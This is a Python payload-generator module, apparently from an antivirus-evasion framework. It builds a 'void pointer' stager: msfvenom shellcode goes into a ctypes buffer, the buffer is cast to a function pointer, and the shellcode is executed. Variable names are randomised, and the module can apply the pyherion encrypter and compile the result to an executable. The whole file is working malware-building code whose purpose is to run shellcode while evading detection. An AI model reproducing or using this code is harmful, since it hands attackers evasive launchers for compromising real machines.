"""

Very basic void pointer reference, similar to the c payload


module by @christruncer/

"""

from modules.common import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import crypters
from modules.common import encryption


class Stager:
	
	def __init__(self):
		# required options
		self.shortname = "VoidPointer"
		self.description = "Very basic void pointer reference, similar to C payload, but in python"
		self.language = "python"
		self.rating = "Normal"
		self.extension = "py"

		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
						"use_pyherion" : ["N", "Use the pyherion encrypter"]}
	
	def generate(self):
		
		# Generate Shellcode Using msfvenom
		self.shellcode = shellcode.Shellcode()
		Shellcode = self.shellcode.generate()

		# Generate Random Variable Names
		RandShellcode = randomizer.randomString()
		RandReverseShell = randomizer.randomString()
		RandMemoryShell = randomizer.randomString()
		
		PayloadCode = 'from ctypes import *\n'
		PayloadCode += RandReverseShell + ' = \"' + Shellcode + '\"\n'
		PayloadCode += RandMemoryShell + ' = create_string_buffer(' + RandReverseShell + ', len(' + RandReverseShell + '))\n'
		PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
		PayloadCode += RandShellcode + '()'
	
		if self.required_options["use_pyherion"][0].lower() == "y":
			PayloadCode = crypters.pyherion(PayloadCode)
		
		return PayloadCode
		
